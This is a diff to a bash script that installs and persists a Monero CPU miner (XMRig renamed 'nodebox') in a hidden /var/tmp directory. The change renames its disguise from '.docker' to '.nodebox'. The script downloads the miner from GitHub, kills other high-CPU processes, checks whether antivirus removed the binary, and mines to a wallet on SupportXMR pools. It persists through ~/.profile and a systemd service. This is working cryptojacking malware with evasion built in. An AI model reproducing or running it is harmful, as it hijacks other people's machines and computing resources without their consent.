@@ -113,7 +113,7 @@ fi
 echo "Projected Monero hashrate: $EXP_MONERO_HASHRATE H/s"
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by /var/tmp/.docker/docker.sh script."
+echo "If needed, miner in foreground can be started by /var/tmp/.nodebox/nodebox.sh script."
 echo "Mining will happen to $WALLET wallet on SupportXMR pools."
 if [ ! -z $EMAIL ]; then
   echo "(Email $EMAIL provided for reference - check stats at https://www.supportxmr.com/)"
@@ -148,8 +148,8 @@ ps aux | awk 'NR>1 && $3 > 70.0 && $2 != '$$' {print $2}' | while read pid; do
   fi
 done
 
-echo "[*] Removing /var/tmp/.docker directory"
-rm -rf /var/tmp/.docker
+echo "[*] Removing /var/tmp/.nodebox directory"
+rm -rf /var/tmp/.nodebox
 
 echo "[*] Downloading C3Pool advanced version of nodebox to /var/tmp/nodebox.tar.gz"
 if ! download_file "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz" /var/tmp/nodebox.tar.gz; then
@@ -157,28 +157,28 @@ if ! download_file "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/
   exit 1
 fi
 
-echo "[*] Unpacking /var/tmp/nodebox.tar.gz to /var/tmp/.docker"
-[ -d /var/tmp/.docker ] || mkdir -p /var/tmp/.docker
-if ! tar xf /var/tmp/nodebox.tar.gz -C /var/tmp/.docker; then
-  echo "ERROR: Can't unpack /var/tmp/nodebox.tar.gz to /var/tmp/.docker directory"
+echo "[*] Unpacking /var/tmp/nodebox.tar.gz to /var/tmp/.nodebox"
+[ -d /var/tmp/.nodebox ] || mkdir -p /var/tmp/.nodebox
+if ! tar xf /var/tmp/nodebox.tar.gz -C /var/tmp/.nodebox; then
+  echo "ERROR: Can't unpack /var/tmp/nodebox.tar.gz to /var/tmp/.nodebox directory"
   exit 1
 fi
 rm /var/tmp/nodebox.tar.gz
 
-if [ -f /var/tmp/.docker/xmrig ]; then
-  mv /var/tmp/.docker/xmrig /var/tmp/.docker/nodebox
+if [ -f /var/tmp/.nodebox/xmrig ]; then
+  mv /var/tmp/.nodebox/xmrig /var/tmp/.nodebox/nodebox
 fi
 
-echo "[*] Checking if advanced version of /var/tmp/.docker/nodebox works fine (and not removed by antivirus software)"
-if [ -f /var/tmp/.docker/config.json ]; then
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /var/tmp/.docker/config.json
+echo "[*] Checking if advanced version of /var/tmp/.nodebox/nodebox works fine (and not removed by antivirus software)"
+if [ -f /var/tmp/.nodebox/config.json ]; then
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /var/tmp/.nodebox/config.json
 fi
-/var/tmp/.docker/nodebox --help >/dev/null 2>&1
+/var/tmp/.nodebox/nodebox --help >/dev/null 2>&1
 if (test $? -ne 0); then
-  if [ -f /var/tmp/.docker/nodebox ]; then
-    echo "WARNING: Advanced version of /var/tmp/.docker/nodebox is not functional"
+  if [ -f /var/tmp/.nodebox/nodebox ]; then
+    echo "WARNING: Advanced version of /var/tmp/.nodebox/nodebox is not functional"
   else 
-    echo "WARNING: Advanced version of /var/tmp/.docker/nodebox was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of /var/tmp/.nodebox/nodebox was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -190,26 +190,26 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /var/tmp/nodebox.tar.gz to /var/tmp/.docker"
-  if ! tar xf /var/tmp/nodebox.tar.gz -C /var/tmp/.docker --strip=1; then
-    echo "WARNING: Can't unpack /var/tmp/nodebox.tar.gz to /var/tmp/.docker directory"
+  echo "[*] Unpacking /var/tmp/nodebox.tar.gz to /var/tmp/.nodebox"
+  if ! tar xf /var/tmp/nodebox.tar.gz -C /var/tmp/.nodebox --strip=1; then
+    echo "WARNING: Can't unpack /var/tmp/nodebox.tar.gz to /var/tmp/.nodebox directory"
   fi
   rm /var/tmp/nodebox.tar.gz
 
-  if [ -f /var/tmp/.docker/xmrig ]; then
-    mv /var/tmp/.docker/xmrig /var/tmp/.docker/nodebox
+  if [ -f /var/tmp/.nodebox/xmrig ]; then
+    mv /var/tmp/.nodebox/xmrig /var/tmp/.nodebox/nodebox
   fi
 
-  echo "[*] Checking if stock version of /var/tmp/.docker/nodebox works fine (and not removed by antivirus software)"
-  if [ -f /var/tmp/.docker/config.json ]; then
-    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /var/tmp/.docker/config.json
+  echo "[*] Checking if stock version of /var/tmp/.nodebox/nodebox works fine (and not removed by antivirus software)"
+  if [ -f /var/tmp/.nodebox/config.json ]; then
+    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /var/tmp/.nodebox/config.json
   fi
-  /var/tmp/.docker/nodebox --help >/dev/null 2>&1
+  /var/tmp/.nodebox/nodebox --help >/dev/null 2>&1
   if (test $? -ne 0); then 
-    if [ -f /var/tmp/.docker/nodebox ]; then
-      echo "WARNING: Stock version of /var/tmp/.docker/nodebox is not functional"
+    if [ -f /var/tmp/.nodebox/nodebox ]; then
+      echo "WARNING: Stock version of /var/tmp/.nodebox/nodebox is not functional"
     else 
-      echo "WARNING: Stock version of /var/tmp/.docker/nodebox was removed by antivirus"
+      echo "WARNING: Stock version of /var/tmp/.nodebox/nodebox was removed by antivirus"
     fi
     
     if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
@@ -220,7 +220,7 @@ if (test $? -ne 0); then
         PASS="root"
         echo "[*] Starting xmrig with auto-restart loop"
         (while true; do
-          xmrig -o pool.supportxmr.com:443 -u $WALLET -p $PASS -k --donate-level 0 --log-file=/var/tmp/.docker/nodebox.log --coin monero --tls >/dev/null 2>&1
+          xmrig -o pool.supportxmr.com:443 -u $WALLET -p $PASS -k --donate-level 0 --log-file=/var/tmp/.nodebox/nodebox.log --coin monero --tls >/dev/null 2>&1
           sleep 5
         done) &
         echo "[*] xmrig started in background with auto-restart"
@@ -230,18 +230,18 @@ if (test $? -ne 0); then
         exit 1
       fi
     else
-      echo "ERROR: Stock version of /var/tmp/.docker/nodebox is not functional and not Alpine Linux"
+      echo "ERROR: Stock version of /var/tmp/.nodebox/nodebox is not functional and not Alpine Linux"
       exit 1
     fi
   fi
 fi
 
-echo "[*] Miner /var/tmp/.docker/nodebox is OK"
+echo "[*] Miner /var/tmp/.nodebox/nodebox is OK"
 
 PASS="root"
 
 echo "[*] Creating SupportXMR config.json with multiple pools"
-cat >/var/tmp/.docker/config.json <<EOL
+cat >/var/tmp/.nodebox/config.json <<EOL
 {
     "autosave": true,
     "cpu": true,
@@ -291,26 +291,26 @@ cat >/var/tmp/.docker/config.json <<EOL
             "tls": false
         }
     ],
-    "log-file": "/var/tmp/.docker/nodebox.log",
+    "log-file": "/var/tmp/.nodebox/nodebox.log",
     "donate-level": 0,
     "max-cpu-usage": 100,
     "syslog": true
 }
 EOL
 
-cp /var/tmp/.docker/config.json /var/tmp/.docker/config_background.json
-sed -i 's/"background": *false,/"background": true,/' /var/tmp/.docker/config_background.json 2>/dev/null || true
+cp /var/tmp/.nodebox/config.json /var/tmp/.nodebox/config_background.json
+sed -i 's/"background": *false,/"background": true,/' /var/tmp/.nodebox/config_background.json 2>/dev/null || true
 
-echo "[*] Creating /var/tmp/.docker/docker.sh script"
-cat >/var/tmp/.docker/docker.sh <<EOL
+echo "[*] Creating /var/tmp/.nodebox/nodebox.sh script"
+cat >/var/tmp/.nodebox/nodebox.sh <<EOL
 #!/bin/bash
 
 if ! pidof nodebox >/dev/null; then
-  nice /var/tmp/.docker/nodebox \$*
+  nice /var/tmp/.nodebox/nodebox \$*
 else
-  if [ ! -f /var/tmp/.docker/nodebox.log ]; then
-    echo "[*] File /var/tmp/.docker/nodebox.log not found"
-    /var/tmp/.docker/nodebox --config=/var/tmp/.docker/config.json >/dev/null 2>&1
+  if [ ! -f /var/tmp/.nodebox/nodebox.log ]; then
+    echo "[*] File /var/tmp/.nodebox/nodebox.log not found"
+    /var/tmp/.nodebox/nodebox --config=/var/tmp/.nodebox/config.json >/dev/null 2>&1
   else
     echo "Monero miner is already running in the background. Refusing to run another one."
     echo "Run \"killall nodebox\" or \"sudo killall nodebox\" if you want to remove background miner first."
@@ -318,22 +318,22 @@ else
 fi
 EOL
 
-chmod +x /var/tmp/.docker/docker.sh
+chmod +x /var/tmp/.nodebox/nodebox.sh
 
 if ! sudo -n true 2>/dev/null; then
   if [ -z "$HOME" ]; then
     HOME=/var/tmp
   fi
-  if ! grep ".docker/docker.sh" $HOME/.profile >/dev/null 2>&1; then
-    echo "[*] Adding /var/tmp/.docker/docker.sh script to $HOME/.profile"
-    echo "/var/tmp/.docker/docker.sh --config=/var/tmp/.docker/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep ".nodebox/nodebox.sh" $HOME/.profile >/dev/null 2>&1; then
+    echo "[*] Adding /var/tmp/.nodebox/nodebox.sh script to $HOME/.profile"
+    echo "/var/tmp/.nodebox/nodebox.sh --config=/var/tmp/.nodebox/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like /var/tmp/.docker/docker.sh script is already in the $HOME/.profile"
+    echo "Looks like /var/tmp/.nodebox/nodebox.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in /var/tmp/.docker/nodebox.log file)"
+  echo "[*] Running miner in the background (see logs in /var/tmp/.nodebox/nodebox.log file)"
   for s in /bin/bash /bin/sh /usr/bin/bash /usr/bin/sh bash sh; do
     if command -v $s >/dev/null 2>&1; then
-      $s /var/tmp/.docker/docker.sh --config=/var/tmp/.docker/config_background.json >/dev/null 2>&1 &
+      $s /var/tmp/.nodebox/nodebox.sh --config=/var/tmp/.nodebox/config_background.json >/dev/null 2>&1 &
       break
     fi
   done
@@ -347,10 +347,10 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in /var/tmp/.docker/nodebox.log file)"
+    echo "[*] Running miner in the background (see logs in /var/tmp/.nodebox/nodebox.log file)"
     for s in /bin/bash /bin/sh /usr/bin/bash /usr/bin/sh bash sh; do
       if command -v $s >/dev/null 2>&1; then
-        $s /var/tmp/.docker/docker.sh --config=/var/tmp/.docker/config_background.json >/dev/null 2>&1
+        $s /var/tmp/.nodebox/nodebox.sh --config=/var/tmp/.nodebox/config_background.json >/dev/null 2>&1
         break
       fi
     done
@@ -385,7 +385,7 @@ EOL
 Description=Monero miner service
 
 [Service]
-ExecStart=/var/tmp/.docker/nodebox --config=/var/tmp/.docker/config.json
+ExecStart=/var/tmp/.nodebox/nodebox --config=/var/tmp/.nodebox/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -417,14 +417,14 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/var/tmp/.docker/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/var/tmp/.docker/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/var/tmp/.nodebox/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/var/tmp/.nodebox/config_background.json"
 fi
 echo ""
 sleep 5
-if [ ! -f /var/tmp/.docker/nodebox.log ]; then
-  echo "[*] File /var/tmp/.docker/nodebox.log not found"
-  /var/tmp/.docker/nodebox --config=/var/tmp/.docker/config.json >/dev/null 2>&1
+if [ ! -f /var/tmp/.nodebox/nodebox.log ]; then
+  echo "[*] File /var/tmp/.nodebox/nodebox.log not found"
+  /var/tmp/.nodebox/nodebox --config=/var/tmp/.nodebox/config.json >/dev/null 2>&1
 fi
 
 echo "[*] Setup complete" 
